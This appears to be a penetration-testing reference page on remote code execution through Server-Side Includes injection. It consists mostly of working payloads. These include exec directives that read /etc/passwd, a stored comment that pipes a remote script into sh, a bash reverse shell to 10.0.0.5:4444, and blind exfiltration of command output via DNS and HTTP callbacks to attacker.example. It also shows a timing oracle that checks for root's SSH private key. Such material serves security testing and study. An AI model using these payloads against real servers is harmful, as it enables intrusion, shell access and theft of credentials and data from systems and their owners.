---
title: "SSI command execution"
description: "The exec directive runs operating-system commands when attacker input reaches an SSI-parsed page, turning reflected markup into remote code execution as the web server user."
keywords:
  - SSI exec cmd
  - SSI command execution
  - shtml RCE
  - exec cmd id
  - Server-Side Includes RCE
---

# Command execution

The `exec` directive is the highest-impact SSI primitive: it runs an operating-system command and splices the command's standard output into the page. When user input reaches a page that the server parses for SSI, an injected `exec` directive runs with the privileges of the web server process, which is remote code execution.

## The directive

Two forms exist. `exec cmd` passes a string to the system shell (`/bin/sh -c` on Unix), and `exec cgi` runs a CGI program by virtual path.

```
<!--#exec cmd="id"-->
<!--#exec cmd="uname -a"-->
<!--#exec cgi="/cgi-bin/script.cgi"-->
```

Because `exec cmd` goes through the shell, the full shell grammar is available inside the string: pipes, redirections, separators, and substitution all work.

```
<!--#exec cmd="/bin/sh -c 'id; uname -a; cat /etc/passwd'"-->
<!--#exec cmd="cat /etc/passwd | head -n 5"-->
```

## Reaching the directive

The payload has to appear in a document the server parses as SSI. Common entry points are any stored or reflected value that is later rendered into an SSI-enabled page: a profile name, a comment body, a User-Agent that is echoed into a status page, a filename shown in a listing, or a search term reflected on an `.shtml` results page.

```
User-Agent: <!--#exec cmd="id"-->
```

```
POST /comment HTTP/1.1
...

body=<!--#exec cmd="curl http://10.0.0.5/s.sh|sh"-->
```

If the comment is stored and the moderation or display page is `.shtml`, the directive runs when that page is generated.

## Confirming execution

Start with a command whose output is unmistakable in the response:

```
<!--#exec cmd="id"-->
```

A reflected `uid=33(www-data) gid=33(www-data)` confirms both execution and the service account. From there, escalate to a full interactive foothold.

```
<!--#exec cmd="/bin/sh -c 'bash -i >& /dev/tcp/10.0.0.5/4444 0>&1'"-->
```

Quote handling matters when the injection point already sits inside an HTML attribute or when the application strips characters. Swap outer and inner quotes as needed, and fall back to `exec cgi`, which runs a CGI program addressed by its URL path, if `cmd` is disabled but CGI execution is not. It invokes an existing CGI endpoint rather than an arbitrary binary, so it is useful where a reachable script runs attacker-influenced input:

```
<!--#exec cmd='id'-->
<!--#exec cgi="/cgi-bin/debug.cgi"-->
```

## Blind execution

When command output is not reflected, drive an out-of-band signal instead. DNS and HTTP callbacks confirm execution and carry small amounts of data:

```
<!--#exec cmd="nslookup $(whoami).attacker.example"-->
<!--#exec cmd="curl http://attacker.example/$(id|base64 -w0)"-->
```

Time delays give a boolean oracle when no network egress is available. Pair the delay with a condition so a measured response time answers a yes-or-no question about the host:

```
<!--#exec cmd="sleep 10"-->
<!--#exec cmd="/bin/sh -c 'test -f /root/.ssh/id_rsa && sleep 10'"-->
```

A response that hangs for ten seconds confirms the file exists; an immediate response confirms it does not. Looping this over filenames, user accounts, or extracted-character guesses reconstructs data with no reflection and no outbound connection.

## nginx and IIS notes

The directive grammar is portable, but the enabling configuration differs. nginx evaluates SSI only when `ssi on` is set for the location and does not provide an `exec cmd` equivalent by default, so `include` and `echo` are the usable primitives there. Apache `mod_include` is where `exec cmd` is most commonly reachable, gated by the `Includes` option (as opposed to `IncludesNOEXEC`, which keeps `echo` and `include` but strips `exec`). On IIS, the `#exec` directive is disabled in default configurations and has to be explicitly enabled, so confirm with `echo` before assuming command execution is available.

## Tools

- **Burp Suite**: injecting and iterating SSI directives through Repeater and Intruder.
- **Burp Collaborator**: confirming blind `exec` execution via DNS and HTTP callbacks.
- Manual testing with crafted `<!--#exec cmd-->` payloads.

## References

- [OWASP: Server-Side Includes (SSI) Injection](https://owasp.org/www-community/attacks/Server-Side_Includes_(SSI)_Injection)
- [PayloadsAllTheThings: Server Side Inclusion / Edge Side Inclusion Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Include%20Injection)
